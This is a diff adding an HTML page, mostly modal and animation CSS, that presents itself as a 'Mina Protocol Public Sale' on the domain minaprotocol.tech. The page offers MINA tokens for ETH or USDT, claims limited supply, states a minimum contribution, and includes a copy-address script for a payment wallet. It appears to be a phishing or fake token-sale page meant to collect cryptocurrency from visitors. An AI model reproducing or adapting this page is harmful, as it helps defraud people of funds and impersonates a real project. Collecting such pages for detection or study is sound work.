+					top: 54px;
+				}
+				65% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				84% {
+					width: 55px;
+					right: 0;
+					top: 35px;
+				}
+				to {
+					width: 47px;
+					right: 8px;
+					top: 38px;
+				}
+			}
+			@keyframes animateSuccessLong {
+				0% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				65% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				84% {
+					width: 55px;
+					right: 0;
+					top: 35px;
+				}
+				to {
+					width: 47px;
+					right: 8px;
+					top: 38px;
+				}
+			}
+			.swal-icon--info {
+				border-color: #c9dae1;
+			}
+			.swal-icon--info:before {
+				width: 5px;
+				height: 29px;
+				bottom: 17px;
+				border-radius: 2px;
+				margin-left: -2px;
+			}
+			.swal-icon--info:after,
+			.swal-icon--info:before {
+				content: '';
+				position: absolute;
+				left: 50%;
+				background-color: #c9dae1;
+			}
+			.swal-icon--info:after {
+				width: 7px;
+				height: 7px;
+				border-radius: 50%;
+				margin-left: -3px;
+				top: 19px;
+			}
+			.swal-icon {
+				width: 80px;
+				height: 80px;
+				border-width: 4px;
+				border-style: solid;
+				border-radius: 50%;
+				padding: 0;
+				position: relative;
+				box-sizing: content-box;
+				margin: 20px auto;
+			}
+			.swal-icon:first-child {
+				margin-top: 32px;
+			}
+			.swal-icon--custom {
+				width: auto;
+				height: auto;
+				max-width: 100%;
+				border: none;
+				border-radius: 0;
+			}
+			.swal-icon img {
+				max-width: 100%;
+				max-height: 100%;
+			}
+			.swal-title {
+				color: rgba(0, 0, 0, 0.65);
+				font-weight: 600;
+				text-transform: none;
+				position: relative;
+				display: block;
+				padding: 13px 16px;
+				font-size: 27px;
+				line-height: normal;
+				text-align: center;
+				margin-bottom: 0;
+			}
+			.swal-title:first-child {
+				margin-top: 26px;
+			}
+			.swal-title:not(:first-child) {
+				padding-bottom: 0;
+			}
+			.swal-title:not(:last-child) {
+				margin-bottom: 13px;
+			}
+			.swal-text {
+				font-size: 16px;
+				position: relative;
+				float: none;
+				line-height: normal;
+				vertical-align: top;
+				text-align: left;
+				display: inline-block;
+				margin: 0;
+				padding: 0 10px;
+				font-weight: 400;
+				color: rgba(0, 0, 0, 0.64);
+				max-width: calc(100% - 20px);
+				overflow-wrap: break-word;
+				box-sizing: border-box;
+			}
+			.swal-text:first-child {
+				margin-top: 45px;
+			}
+			.swal-text:last-child {
+				margin-bottom: 45px;
+			}
+			.swal-footer {
+				text-align: right;
+				padding-top: 13px;
+				margin-top: 13px;
+				padding: 13px 16px;
+				border-radius: inherit;
+				border-top-left-radius: 0;
+				border-top-right-radius: 0;
+			}
+			.swal-button-container {
+				margin: 5px;
+				display: inline-block;
+				position: relative;
+			}
+			.swal-button {
+				background-color: #7cd1f9;
+				color: #fff;
+				border: none;
+				box-shadow: none;
+				border-radius: 5px;
+				font-weight: 600;
+				font-size: 14px;
+				padding: 10px 24px;
+				margin: 0;
+				cursor: pointer;
+			}
+			.swal-button:not([disabled]):hover {
+				background-color: #78cbf2;
+			}
+			.swal-button:active {
+				background-color: #70bce0;
+			}
+			.swal-button:focus {
+				outline: none;
+				box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(43, 114, 165, 0.29);
+			}
+			.swal-button[disabled] {
+				opacity: 0.5;
+				cursor: default;
+			}
+			.swal-button::-moz-focus-inner {
+				border: 0;
+			}
+			.swal-button--cancel {
+				color: #555;
+				background-color: #efefef;
+			}
+			.swal-button--cancel:not([disabled]):hover {
+				background-color: #e8e8e8;
+			}
+			.swal-button--cancel:active {
+				background-color: #d7d7d7;
+			}
+			.swal-button--cancel:focus {
+				box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(116, 136, 150, 0.29);
+			}
+			.swal-button--danger {
+				background-color: #e64942;
+			}
+			.swal-button--danger:not([disabled]):hover {
+				background-color: #df4740;
+			}
+			.swal-button--danger:active {
+				background-color: #cf423b;
+			}
+			.swal-button--danger:focus {
+				box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(165, 43, 43, 0.29);
+			}
+			.swal-content {
+				padding: 0 20px;
+				margin-top: 20px;
+				font-size: medium;
+			}
+			.swal-content:last-child {
+				margin-bottom: 20px;
+			}
+			.swal-content__input,
+			.swal-content__textarea {
+				-webkit-appearance: none;
+				background-color: #fff;
+				border: none;
+				font-size: 14px;
+				display: block;
+				box-sizing: border-box;
+				width: 100%;
+				border: 1px solid rgba(0, 0, 0, 0.14);
+				padding: 10px 13px;
+				border-radius: 2px;
+				transition: border-color 0.2s;
+			}
+			.swal-content__input:focus,
+			.swal-content__textarea:focus {
+				outline: none;
+				border-color: #6db8ff;
+			}
+			.swal-content__textarea {
+				resize: vertical;
+			}
+			.swal-button--loading {
+				color: transparent;
+			}
+			.swal-button--loading ~ .swal-button__loader {
+				opacity: 1;
+			}
+			.swal-button__loader {
+				position: absolute;
+				height: auto;
+				width: 43px;
+				z-index: 2;
+				left: 50%;
+				top: 50%;
+				-webkit-transform: translateX(-50%) translateY(-50%);
+				transform: translateX(-50%) translateY(-50%);
+				text-align: center;
+				pointer-events: none;
+				opacity: 0;
+			}
+			.swal-button__loader div {
+				display: inline-block;
+				float: none;
+				vertical-align: baseline;
+				width: 9px;
+				height: 9px;
+				padding: 0;
+				border: none;
+				margin: 2px;
+				opacity: 0.4;
+				border-radius: 7px;
+				background-color: hsla(0, 0%, 100%, 0.9);
+				transition: background 0.2s;
+				-webkit-animation: swal-loading-anim 1s infinite;
+				animation: swal-loading-anim 1s infinite;
+			}
+			.swal-button__loader div:nth-child(3n + 2) {
+				-webkit-animation-delay: 0.15s;
+				animation-delay: 0.15s;
+			}
+			.swal-button__loader div:nth-child(3n + 3) {
+				-webkit-animation-delay: 0.3s;
+				animation-delay: 0.3s;
+			}
+			@-webkit-keyframes swal-loading-anim {
+				0% {
+					opacity: 0.4;
+				}
+				20% {
+					opacity: 0.4;
+				}
+				50% {
+					opacity: 1;
+				}
+				to {
+					opacity: 0.4;
+				}
+			}
+			@keyframes swal-loading-anim {
+				0% {
+					opacity: 0.4;
+				}
+				20% {
+					opacity: 0.4;
+				}
+				50% {
+					opacity: 1;
+				}
+				to {
+					opacity: 0.4;
+				}
+			}
+			.swal-overlay {
+				position: fixed;
+				top: 0;
+				bottom: 0;
+				left: 0;
+				right: 0;
+				text-align: center;
+				font-size: 0;
+				overflow-y: auto;
+				background-color: rgba(0, 0, 0, 0.4);
+				z-index: 10000;
+				pointer-events: none;
+				opacity: 0;
+				transition: opacity 0.3s;
+			}
+			.swal-overlay:before {
+				content: ' ';
+				display: inline-block;
+				vertical-align: middle;
+				height: 100%;
+			}
+			.swal-overlay--show-modal {
+				opacity: 1;
+				pointer-events: auto;
+			}
+			.swal-overlay--show-modal .swal-modal {
+				opacity: 1;
+				pointer-events: auto;
+				box-sizing: border-box;
+				-webkit-animation: showSweetAlert 0.3s;
+				animation: showSweetAlert 0.3s;
+				will-change: transform;
+			}
+			.swal-modal {
+				width: 478px;
+				opacity: 0;
+				pointer-events: none;
+				background-color: #fff;
+				text-align: center;
+				border-radius: 5px;
+				position: static;
+				margin: 20px auto;
+				display: inline-block;
+				vertical-align: middle;
+				-webkit-transform: scale(1);
+				transform: scale(1);
+				-webkit-transform-origin: 50% 50%;
+				transform-origin: 50% 50%;
+				z-index: 10001;
+				transition: opacity 0.2s, -webkit-transform 0.3s;
+				transition: transform 0.3s, opacity 0.2s;
+				transition: transform 0.3s, opacity 0.2s, -webkit-transform 0.3s;
+			}
+			@media (max-width: 500px) {
+				.swal-modal {
+					width: calc(100% - 20px);
+				}
+			}
+			@-webkit-keyframes showSweetAlert {
+				0% {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+				1% {
+					-webkit-transform: scale(0.5);
+					transform: scale(0.5);
+				}
+				45% {
+					-webkit-transform: scale(1.05);
+					transform: scale(1.05);
+				}
+				80% {
+					-webkit-transform: scale(0.95);
+					transform: scale(0.95);
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+			}
+			@keyframes showSweetAlert {
+				0% {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+				1% {
+					-webkit-transform: scale(0.5);
+					transform: scale(0.5);
+				}
+				45% {
+					-webkit-transform: scale(1.05);
+					transform: scale(1.05);
+				}
+				80% {
+					-webkit-transform: scale(0.95);
+					transform: scale(0.95);
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+			}
+		</style>
+		<style class="darkreader darkreader--sync" media="screen"></style>
+		<!-- Global site tag (gtag.js) - Google Analytics -->
+		<script async="" src="./index_files/js"></script>
+		<script>
+			window.dataLayer = window.dataLayer || []
+			function gtag() {
+				dataLayer.push(arguments)
+			}
+			gtag('js', new Date())
+
+			gtag('config', 'G-X4TDG4BGBC')
+		</script>
+		<script>
+			function copyFunction() {
+				var copyText = document.getElementById('addr')
+				copyText.select()
+				copyText.setSelectionRange(0, 99999)
+				document.execCommand('copy')
+			}
+		</script>
+		<style>
+			.countdown-text {
+				color: #fff !important;
+			}
+			.countdown-time {
+				color: #74fffa !important;
+			}
+		</style>
+		<style class="darkreader darkreader--sync" media="screen"></style>
+		<style type="text/css">
+			.pay-option-label {
+				cursor: auto !important;
+			}
+			.swal-icon--error {
+				border-color: #f27474;
+				-webkit-animation: animateErrorIcon 0.5s;
+				animation: animateErrorIcon 0.5s;
+			}
+			.swal-icon--error__x-mark {
+				position: relative;
+				display: block;
+				-webkit-animation: animateXMark 0.5s;
+				animation: animateXMark 0.5s;
+			}
+			.swal-icon--error__line {
+				position: absolute;
+				height: 5px;
+				width: 47px;
+				background-color: #f27474;
+				display: block;
+				top: 37px;
+				border-radius: 2px;
+			}
+			.swal-icon--error__line--left {
+				-webkit-transform: rotate(45deg);
+				transform: rotate(45deg);
+				left: 17px;
+			}
+			.swal-icon--error__line--right {
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				right: 16px;
+			}
+			@-webkit-keyframes animateErrorIcon {
+				0% {
+					-webkit-transform: rotateX(100deg);
+					transform: rotateX(100deg);
+					opacity: 0;
+				}
+				to {
+					-webkit-transform: rotateX(0deg);
+					transform: rotateX(0deg);
+					opacity: 1;
+				}
+			}
+			@keyframes animateErrorIcon {
+				0% {
+					-webkit-transform: rotateX(100deg);
+					transform: rotateX(100deg);
+					opacity: 0;
+				}
+				to {
+					-webkit-transform: rotateX(0deg);
+					transform: rotateX(0deg);
+					opacity: 1;
+				}
+			}
+			@-webkit-keyframes animateXMark {
+				0% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				50% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				80% {
+					-webkit-transform: scale(1.15);
+					transform: scale(1.15);
+					margin-top: -6px;
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+					margin-top: 0;
+					opacity: 1;
+				}
+			}
+			@keyframes animateXMark {
+				0% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				50% {
+					-webkit-transform: scale(0.4);
+					transform: scale(0.4);
+					margin-top: 26px;
+					opacity: 0;
+				}
+				80% {
+					-webkit-transform: scale(1.15);
+					transform: scale(1.15);
+					margin-top: -6px;
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+					margin-top: 0;
+					opacity: 1;
+				}
+			}
+			.swal-icon--warning {
+				border-color: #f8bb86;
+				-webkit-animation: pulseWarning 0.75s infinite alternate;
+				animation: pulseWarning 0.75s infinite alternate;
+			}
+			.swal-icon--warning__body {
+				width: 5px;
+				height: 47px;
+				top: 10px;
+				border-radius: 2px;
+				margin-left: -2px;
+			}
+			.swal-icon--warning__body,
+			.swal-icon--warning__dot {
+				position: absolute;
+				left: 50%;
+				background-color: #f8bb86;
+			}
+			.swal-icon--warning__dot {
+				width: 7px;
+				height: 7px;
+				border-radius: 50%;
+				margin-left: -4px;
+				bottom: -11px;
+			}
+			@-webkit-keyframes pulseWarning {
+				0% {
+					border-color: #f8d486;
+				}
+				to {
+					border-color: #f8bb86;
+				}
+			}
+			@keyframes pulseWarning {
+				0% {
+					border-color: #f8d486;
+				}
+				to {
+					border-color: #f8bb86;
+				}
+			}
+			.swal-icon--success {
+				border-color: #a5dc86;
+			}
+			.swal-icon--success:after,
+			.swal-icon--success:before {
+				content: '';
+				border-radius: 50%;
+				position: absolute;
+				width: 60px;
+				height: 120px;
+				background: #fff;
+				-webkit-transform: rotate(45deg);
+				transform: rotate(45deg);
+			}
+			.swal-icon--success:before {
+				border-radius: 120px 0 0 120px;
+				top: -7px;
+				left: -33px;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				-webkit-transform-origin: 60px 60px;
+				transform-origin: 60px 60px;
+			}
+			.swal-icon--success:after {
+				border-radius: 0 120px 120px 0;
+				top: -11px;
+				left: 30px;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				-webkit-transform-origin: 0 60px;
+				transform-origin: 0 60px;
+				-webkit-animation: rotatePlaceholder 4.25s ease-in;
+				animation: rotatePlaceholder 4.25s ease-in;
+			}
+			.swal-icon--success__ring {
+				width: 80px;
+				height: 80px;
+				border: 4px solid hsla(98, 55%, 69%, 0.2);
+				border-radius: 50%;
+				box-sizing: content-box;
+				position: absolute;
+				left: -4px;
+				top: -4px;
+				z-index: 2;
+			}
+			.swal-icon--success__hide-corners {
+				width: 5px;
+				height: 90px;
+				background-color: #fff;
+				padding: 1px;
+				position: absolute;
+				left: 28px;
+				top: 8px;
+				z-index: 1;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+			}
+			.swal-icon--success__line {
+				height: 5px;
+				background-color: #a5dc86;
+				display: block;
+				border-radius: 2px;
+				position: absolute;
+				z-index: 2;
+			}
+			.swal-icon--success__line--tip {
+				width: 25px;
+				left: 14px;
+				top: 46px;
+				-webkit-transform: rotate(45deg);
+				transform: rotate(45deg);
+				-webkit-animation: animateSuccessTip 0.75s;
+				animation: animateSuccessTip 0.75s;
+			}
+			.swal-icon--success__line--long {
+				width: 47px;
+				right: 8px;
+				top: 38px;
+				-webkit-transform: rotate(-45deg);
+				transform: rotate(-45deg);
+				-webkit-animation: animateSuccessLong 0.75s;
+				animation: animateSuccessLong 0.75s;
+			}
+			@-webkit-keyframes rotatePlaceholder {
+				0% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				5% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				12% {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+				to {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+			}
+			@keyframes rotatePlaceholder {
+				0% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				5% {
+					-webkit-transform: rotate(-45deg);
+					transform: rotate(-45deg);
+				}
+				12% {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+				to {
+					-webkit-transform: rotate(-405deg);
+					transform: rotate(-405deg);
+				}
+			}
+			@-webkit-keyframes animateSuccessTip {
+				0% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				54% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				70% {
+					width: 50px;
+					left: -8px;
+					top: 37px;
+				}
+				84% {
+					width: 17px;
+					left: 21px;
+					top: 48px;
+				}
+				to {
+					width: 25px;
+					left: 14px;
+					top: 45px;
+				}
+			}
+			@keyframes animateSuccessTip {
+				0% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				54% {
+					width: 0;
+					left: 1px;
+					top: 19px;
+				}
+				70% {
+					width: 50px;
+					left: -8px;
+					top: 37px;
+				}
+				84% {
+					width: 17px;
+					left: 21px;
+					top: 48px;
+				}
+				to {
+					width: 25px;
+					left: 14px;
+					top: 45px;
+				}
+			}
+			@-webkit-keyframes animateSuccessLong {
+				0% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				65% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				84% {
+					width: 55px;
+					right: 0;
+					top: 35px;
+				}
+				to {
+					width: 47px;
+					right: 8px;
+					top: 38px;
+				}
+			}
+			@keyframes animateSuccessLong {
+				0% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				65% {
+					width: 0;
+					right: 46px;
+					top: 54px;
+				}
+				84% {
+					width: 55px;
+					right: 0;
+					top: 35px;
+				}
+				to {
+					width: 47px;
+					right: 8px;
+					top: 38px;
+				}
+			}
+			.swal-icon--info {
+				border-color: #c9dae1;
+			}
+			.swal-icon--info:before {
+				width: 5px;
+				height: 29px;
+				bottom: 17px;
+				border-radius: 2px;
+				margin-left: -2px;
+			}
+			.swal-icon--info:after,
+			.swal-icon--info:before {
+				content: '';
+				position: absolute;
+				left: 50%;
+				background-color: #c9dae1;
+			}
+			.swal-icon--info:after {
+				width: 7px;
+				height: 7px;
+				border-radius: 50%;
+				margin-left: -3px;
+				top: 19px;
+			}
+			.swal-icon {
+				width: 80px;
+				height: 80px;
+				border-width: 4px;
+				border-style: solid;
+				border-radius: 50%;
+				padding: 0;
+				position: relative;
+				box-sizing: content-box;
+				margin: 20px auto;
+			}
+			.swal-icon:first-child {
+				margin-top: 32px;
+			}
+			.swal-icon--custom {
+				width: auto;
+				height: auto;
+				max-width: 100%;
+				border: none;
+				border-radius: 0;
+			}
+			.swal-icon img {
+				max-width: 100%;
+				max-height: 100%;
+			}
+			.swal-title {
+				color: rgba(0, 0, 0, 0.65);
+				font-weight: 600;
+				text-transform: none;
+				position: relative;
+				display: block;
+				padding: 13px 16px;
+				font-size: 27px;
+				line-height: normal;
+				text-align: center;
+				margin-bottom: 0;
+			}
+			.swal-title:first-child {
+				margin-top: 26px;
+			}
+			.swal-title:not(:first-child) {
+				padding-bottom: 0;
+			}
+			.swal-title:not(:last-child) {
+				margin-bottom: 13px;
+			}
+			.swal-text {
+				font-size: 16px;
+				position: relative;
+				float: none;
+				line-height: normal;
+				vertical-align: top;
+				text-align: left;
+				display: inline-block;
+				margin: 0;
+				padding: 0 10px;
+				font-weight: 400;
+				color: rgba(0, 0, 0, 0.64);
+				max-width: calc(100% - 20px);
+				overflow-wrap: break-word;
+				box-sizing: border-box;
+			}
+			.swal-text:first-child {
+				margin-top: 45px;
+			}
+			.swal-text:last-child {
+				margin-bottom: 45px;
+			}
+			.swal-footer {
+				text-align: right;
+				padding-top: 13px;
+				margin-top: 13px;
+				padding: 13px 16px;
+				border-radius: inherit;
+				border-top-left-radius: 0;
+				border-top-right-radius: 0;
+			}
+			.swal-button-container {
+				margin: 5px;
+				display: inline-block;
+				position: relative;
+			}
+			.swal-button {
+				background-color: #7cd1f9;
+				color: #fff;
+				border: none;
+				box-shadow: none;
+				border-radius: 5px;
+				font-weight: 600;
+				font-size: 14px;
+				padding: 10px 24px;
+				margin: 0;
+				cursor: pointer;
+			}
+			.swal-button:not([disabled]):hover {
+				background-color: #78cbf2;
+			}
+			.swal-button:active {
+				background-color: #70bce0;
+			}
+			.swal-button:focus {
+				outline: none;
+				box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(43, 114, 165, 0.29);
+			}
+			.swal-button[disabled] {
+				opacity: 0.5;
+				cursor: default;
+			}
+			.swal-button::-moz-focus-inner {
+				border: 0;
+			}
+			.swal-button--cancel {
+				color: #555;
+				background-color: #efefef;
+			}
+			.swal-button--cancel:not([disabled]):hover {
+				background-color: #e8e8e8;
+			}
+			.swal-button--cancel:active {
+				background-color: #d7d7d7;
+			}
+			.swal-button--cancel:focus {
+				box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(116, 136, 150, 0.29);
+			}
+			.swal-button--danger {
+				background-color: #e64942;
+			}
+			.swal-button--danger:not([disabled]):hover {
+				background-color: #df4740;
+			}
+			.swal-button--danger:active {
+				background-color: #cf423b;
+			}
+			.swal-button--danger:focus {
+				box-shadow: 0 0 0 1px #fff, 0 0 0 3px rgba(165, 43, 43, 0.29);
+			}
+			.swal-content {
+				padding: 0 20px;
+				margin-top: 20px;
+				font-size: medium;
+			}
+			.swal-content:last-child {
+				margin-bottom: 20px;
+			}
+			.swal-content__input,
+			.swal-content__textarea {
+				-webkit-appearance: none;
+				background-color: #fff;
+				border: none;
+				font-size: 14px;
+				display: block;
+				box-sizing: border-box;
+				width: 100%;
+				border: 1px solid rgba(0, 0, 0, 0.14);
+				padding: 10px 13px;
+				border-radius: 2px;
+				transition: border-color 0.2s;
+			}
+			.swal-content__input:focus,
+			.swal-content__textarea:focus {
+				outline: none;
+				border-color: #6db8ff;
+			}
+			.swal-content__textarea {
+				resize: vertical;
+			}
+			.swal-button--loading {
+				color: transparent;
+			}
+			.swal-button--loading ~ .swal-button__loader {
+				opacity: 1;
+			}
+			.swal-button__loader {
+				position: absolute;
+				height: auto;
+				width: 43px;
+				z-index: 2;
+				left: 50%;
+				top: 50%;
+				-webkit-transform: translateX(-50%) translateY(-50%);
+				transform: translateX(-50%) translateY(-50%);
+				text-align: center;
+				pointer-events: none;
+				opacity: 0;
+			}
+			.swal-button__loader div {
+				display: inline-block;
+				float: none;
+				vertical-align: baseline;
+				width: 9px;
+				height: 9px;
+				padding: 0;
+				border: none;
+				margin: 2px;
+				opacity: 0.4;
+				border-radius: 7px;
+				background-color: hsla(0, 0%, 100%, 0.9);
+				transition: background 0.2s;
+				-webkit-animation: swal-loading-anim 1s infinite;
+				animation: swal-loading-anim 1s infinite;
+			}
+			.swal-button__loader div:nth-child(3n + 2) {
+				-webkit-animation-delay: 0.15s;
+				animation-delay: 0.15s;
+			}
+			.swal-button__loader div:nth-child(3n + 3) {
+				-webkit-animation-delay: 0.3s;
+				animation-delay: 0.3s;
+			}
+			@-webkit-keyframes swal-loading-anim {
+				0% {
+					opacity: 0.4;
+				}
+				20% {
+					opacity: 0.4;
+				}
+				50% {
+					opacity: 1;
+				}
+				to {
+					opacity: 0.4;
+				}
+			}
+			@keyframes swal-loading-anim {
+				0% {
+					opacity: 0.4;
+				}
+				20% {
+					opacity: 0.4;
+				}
+				50% {
+					opacity: 1;
+				}
+				to {
+					opacity: 0.4;
+				}
+			}
+			.swal-overlay {
+				position: fixed;
+				top: 0;
+				bottom: 0;
+				left: 0;
+				right: 0;
+				text-align: center;
+				font-size: 0;
+				overflow-y: auto;
+				background-color: rgba(0, 0, 0, 0.4);
+				z-index: 10000;
+				pointer-events: none;
+				opacity: 0;
+				transition: opacity 0.3s;
+			}
+			.swal-overlay:before {
+				content: ' ';
+				display: inline-block;
+				vertical-align: middle;
+				height: 100%;
+			}
+			.swal-overlay--show-modal {
+				opacity: 1;
+				pointer-events: auto;
+			}
+			.swal-overlay--show-modal .swal-modal {
+				opacity: 1;
+				pointer-events: auto;
+				box-sizing: border-box;
+				-webkit-animation: showSweetAlert 0.3s;
+				animation: showSweetAlert 0.3s;
+				will-change: transform;
+			}
+			.swal-modal {
+				width: 478px;
+				opacity: 0;
+				pointer-events: none;
+				background-color: #fff;
+				text-align: center;
+				border-radius: 5px;
+				position: static;
+				margin: 20px auto;
+				display: inline-block;
+				vertical-align: middle;
+				-webkit-transform: scale(1);
+				transform: scale(1);
+				-webkit-transform-origin: 50% 50%;
+				transform-origin: 50% 50%;
+				z-index: 10001;
+				transition: opacity 0.2s, -webkit-transform 0.3s;
+				transition: transform 0.3s, opacity 0.2s;
+				transition: transform 0.3s, opacity 0.2s, -webkit-transform 0.3s;
+			}
+			@media (max-width: 500px) {
+				.swal-modal {
+					width: calc(100% - 20px);
+				}
+			}
+			@-webkit-keyframes showSweetAlert {
+				0% {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+				1% {
+					-webkit-transform: scale(0.5);
+					transform: scale(0.5);
+				}
+				45% {
+					-webkit-transform: scale(1.05);
+					transform: scale(1.05);
+				}
+				80% {
+					-webkit-transform: scale(0.95);
+					transform: scale(0.95);
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+			}
+			@keyframes showSweetAlert {
+				0% {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+				1% {
+					-webkit-transform: scale(0.5);
+					transform: scale(0.5);
+				}
+				45% {
+					-webkit-transform: scale(1.05);
+					transform: scale(1.05);
+				}
+				80% {
+					-webkit-transform: scale(0.95);
+					transform: scale(0.95);
+				}
+				to {
+					-webkit-transform: scale(1);
+					transform: scale(1);
+				}
+			}
+		</style>
+		<style class="darkreader darkreader--sync" media="screen"></style>
+
+		<meta name="author" content="Mina Protocol" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+		<meta
+			name="description"
+			content="Mina is the first cryptocurrency with a succinct blockchain. Our lightweight blockchain means anyone can use Mina directly from any device, in less data than a few tweets."
+		/>
+		<!-- Fav Icon -->
+		<link rel="shortcut icon" href="https://minaprotocol.tech/images/favicon.png" />
+		<!-- Site Title  -->
+		<title>Mina Protocol</title>
+		<!-- Vendor Bundle CSS -->
+		<link rel="stylesheet" href="./index_files/vendor.bundle﹖ver=104.css" />
+		<style class="darkreader darkreader--sync" media="screen"></style>
+		<!-- Custom styles for this template -->
+		<link rel="stylesheet" href="./index_files/style﹖ver=104.css" id="layoutstyle" />
+		<style class="darkreader darkreader--sync" media="screen"></style>
+		<style></style>
+		<style class="darkreader darkreader--sync" media="screen"></style>
+		<meta name="darkreader" content="bf740d517b8ff0124b9b53595c3e7b63" />
+		<style class="darkreader darkreader--override" media="screen">
+			.vimvixen-hint {
+				background-color: #7b5300 !important;
+				border-color: #d8b013 !important;
+				color: #f3e8c8 !important;
+			}
+			::placeholder {
+				opacity: 0.5 !important;
+			}
+			a[href="https://coinmarketcap.com/"] > svg[width="94"][height="16"] > path
+			{
+				fill: var(--darkreader-neutral-text) !important;
+			}
+			#edge-translate-panel-body {
+				color: var(--darkreader-neutral-text) !important;
+			}
+		</style>
+	</head>
+	<body class="page-user no-touch">
+		<div class="topbar-wrap">
+			<div class="topbar is-sticky">
+				<div class="container">
+					<div class="d-flex justify-content-between align-items-center">
+						<ul class="topbar-nav d-lg-none">
+							<li class="topbar-nav-item relative">
+								<a class="toggle-nav" href="https://minaprotocol.tech/#">
+									<div class="toggle-icon">
+										<span class="toggle-line"> </span>
+										<span class="toggle-line"> </span>
+										<span class="toggle-line"> </span>
+										<span class="toggle-line"> </span>
+									</div>
+								</a>
+							</li>
+							<!-- .topbar-nav-item -->
+						</ul>
+						<!-- .topbar-nav -->
+						<a class="topbar-logo" href="https://minaprotocol.tech/">
+							<img src="./index_files/logo.svg" srcset="images/logo.svg 2x" alt="logo" />
+						</a>
+						<!-- .topbar-nav -->
+					</div>
+				</div>
+				<!-- .container -->
+			</div>
+			<!-- .topbar -->
+			<div class="navbar">
+				<div class="container">
+					<div class="navbar-innr">
+						<ul class="navbar-menu">
+							<li class="active">
+								<a href="https://minaprotocol.tech/"> <em class="ikon ikon-coins"> </em> Public Sale </a>
+							</li>
+						</ul>
+						<ul class="navbar-btns">
+							<li>
+								<a
+									href="https://minaprotocol.tech/#"
+									data-toggle="modal"
+									data-target="#get-pay-address"
+									class="btn btn-sm btn-outline btn-light"
+									><em class="text-primary ti ti-wallet"></em><span>Buy MINA Token</span></a
+								>
+							</li>
+						</ul>
+					</div>
+					<!-- .navbar-innr -->
+				</div>
+				<!-- .container -->
+			</div>
+			<!-- .navbar -->
+		</div>
+		<!-- .topbar-wrap -->
+		<div class="page-content">
+			<div class="container">
+				<div class="row">
+					<div class="main-content col-lg-8">
+						<div class="content-area card">
+							<div class="card-innr">
+								<div class="card-head">
+									<h4 class="card-title">Public Sale Rates</h4>
+								</div>
+								<div class="card-text">
+									<p>You can buy MINA tokens using ETH or USDT.</p>
+								</div>
+								<div class="token-currency-choose">
+									<div class="row guttar-15px">
+										<div class="col-6">
+											<div class="pay-option">
+												<label class="pay-option-label" for="payeth">
+													<span class="pay-title">
+														<em class="pay-icon cf cf-eth"> </em>
+														<span class="pay-cur">1 ETH </span>
+													</span>
+													<span class="pay-amount">9540 MINA </span>
+												</label>
+											</div>
+										</div>
+										<div class="col-6">
+											<div class="pay-option">
+												<label class="pay-option-label" for="paylte">
+													<span class="pay-title">
+														<em class="pay-icon cf cf-usdt"> </em>
+														<span class="pay-cur">2.5 USDT </span>
+													</span>
+													<span class="pay-amount">10 MINA </span>
+												</label>
+											</div>
+										</div>
+									</div>
+									<!-- .row -->
+								</div>
+
+								<div class="card-head">
+									<h4 class="card-title">Attend Mina Protocol Public Sale</h4>
+								</div>
+								<div class="card-text">
+									<p>
+										In order to join the Mina Protocol Public Sale please press the button below to start the purchase process. We only have
+										a limited supply available!
+									</p>
+								</div>
+								<div class="pay-buttons">
+									<div class="pay-button">
+										<a
+											href="https://minaprotocol.tech/#"
+											data-toggle="modal"
+											data-target="#get-pay-address"
+											class="btn btn-primary btn-between w-100"
+											>Buy MINA Token
+											<em class="ti ti-wallet"> </em>
+										</a>
+									</div>
+								</div>
+								<div class="token-calc-note note note-plane">
+									<em class="fas fa-times-circle text-danger"> </em>
+									<span class="note-text text-light">Minimum Contribution: 0.25 ETH / 596 USDT </span>
+								</div>
+							</div>
+							<!-- .card-innr -->
+						</div>
+						<!-- .content-area -->
+					</div>
+					<!-- .col -->
+
+					<div class="aside sidebar-right col-lg-4">
+						<div class="token-statistics card card-token height-auto">
+							<div class="card-innr">
+								<div class="token-balance">
+									<div class="token-balance-text">
+										<h6 class="card-sub-title">Tokens For Sale</h6>
+										<span class="lead"
+											>75,000,000
+											<span>MINA </span>
